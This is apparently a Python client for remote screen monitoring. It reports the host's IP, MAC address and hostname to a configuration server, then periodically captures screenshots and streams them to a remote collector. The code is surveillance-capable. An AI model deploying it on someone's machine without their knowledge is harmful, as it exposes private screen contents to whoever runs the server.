#!/usr/bin/python3
#-*-coding:utf-8-*-

import os
import sys
import time
import threading
import logging
import schedule
import urllib.request
import urllib.parse
import urllib.error
import configparser

import uuid
import json
import socket
from PIL import ImageGrab

import worker


'''base config'''
def basecfg(userkey):
    url = 'http://www.example.com/pyshots.php?action=getconfig'
    bodys = {'userkey':userkey}
    bodys = urllib.parse.urlencode(bodys).encode('utf-8')

    
    hostip = socket.gethostbyname(socket.getfqdn(socket.gethostname()))
    hostmac = uuid.UUID(int=uuid.getnode()).hex[-12:].upper()
    hostname = socket.gethostname()
    headers = {"D": hostmac, "V": '1.0.0', 'P':os.name, 'I':userkey[:16], 'T':userkey[16:], 'R':hostname, 'B':hostip}
    
    result = None
    while True:
        try:
            request = urllib.request.Request(url=url, method='POST', data=bodys, headers=headers)
            response = urllib.request.urlopen(request)
        except urllib.error.URLError as reason:
            logging.error("URLError:" + str(reason))
        except urllib.error.HTTPError as reason:
            logging.error("HTTPError:" + str(reason))
        else:
            #logging.debug(response.read().decode('utf-8'))
            result = response.read()
            logging.debug(result)
            
        try:
            result = json.loads(result)
        except json.decoder.JSONDecodeError as e:
            logging.info('reloading...')
            logging.error(e)
            time.sleep(60)
        except TypeError as e:
            logging.info('reloading...')
            logging.error(e)
            time.sleep(60)
        except:
            logging.info('reloading...')
            logging.error(e)
            time.sleep(60)
        else:
            break
    
    return result


'''remote ip'''
def ipinfo():
    url = 'http://www.example.com/tools.php?action=remote'
    result = None
    while True:
        try:
            request = urllib.request.Request(url=url, headers={})
            response = urllib.request.urlopen(request)
        except urllib.error.URLError as reason:
            logging.error("URLError:" + str(reason))
        except urllib.error.HTTPError as reason:
            logging.error("HTTPError:" + str(reason))
        else:
            #logging.debug(response.read().decode('utf-8'))
            result = response.read()
            logging.debug(result)
            
        try:
            result = json.loads(result)
        except json.decoder.JSONDecodeError as e:
            logging.error(e)
            time.sleep(5)
        else:
            break
    return result



def grabshot():
    filepath = os.path.join(basedir, 'clientcrt.tmp')
    try:
        im = ImageGrab.grab()
    except OSError as e:
        logging.error(e)
        return None

    now = time.time()
    im.save(filepath, 'png')

    filesize = os.stat(filepath).st_size
    filename = '{filename}.{fileextd}'.format(filename=time.strftime('%Y%m%d%H%M%S', time.localtime(now)), fileextd='png')

    #若连接异常丢失则直接返回忽略
    try:
        cw.sw.send({'filename':filename, 'filesize':filesize, 'filetime':now}, encoding='json')
        cw.sw.sendfile(filepath)
    except ConnectionResetError as e:
        #cw.reconnect()
        return None
    except ConnectionAbortedError as e:
        #cw.reconnect()
        return None
    except:
        #cw.reconnect()
        return None

    logging.info("sended:%s"%filename)


if __name__ == '__main__':
    #LoggingLevel:debug[DEBUG]info[INFO]warn[WARN]error[ERROR]critical[CRITICAL]
    logging.basicConfig(level=logging.INFO)

    #debug switcher True False
    production = False
    
    #basedir = os.path.dirname(os.path.realpath(__file__))
    basedir = os.path.dirname(sys.argv[0])



    #make sure process single
    testport = 8849 if production else 8839
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    try:
        sk.bind(('0.0.0.0', testport))
    except OSError as e:
        logging.error('singleInstance')
        sys.exit(1)

    
    #get base config
    cp = configparser.ConfigParser()
    cp.read(os.path.join(basedir, 'clientmnt.ini'), encoding='utf-8')
    userkey = ''
    try:
        userkey = cp.get('general', 'userkey')
    except:
        #logging.error(cf)
        #logging.error(e)
        #time.sleep(5)
        pass


    if production:
        bcfg = basecfg(userkey)
        hostport = bcfg.get('host'), bcfg.get('port')
        blanking = bcfg.get('blanking', 60)
    else:
        hostport = ('192.168.1.28', 8838)
        blanking = 5
        
    cw = worker.ClientWorker(hostport, userkey)
    #blocking if connect failed
    cw.connect()


    #t = threading.Thread(target=grabshot, args=())
    #t.start()
    #t.join()

    '''
    schedule.every(10).minutes.do(job)
    schedule.every().hour.do(job)
    schedule.every().day.at("10:30").do(job)
    schedule.every().monday.do(job)
    schedule.every().wednesday.at("13:15").do(job)
    schedule.every().minute.at(":17").do(job)
    '''
    
    #blanking default 60
    schedule.every(blanking).seconds.do(grabshot)

    while True:
        schedule.run_pending()
        time.sleep(1)
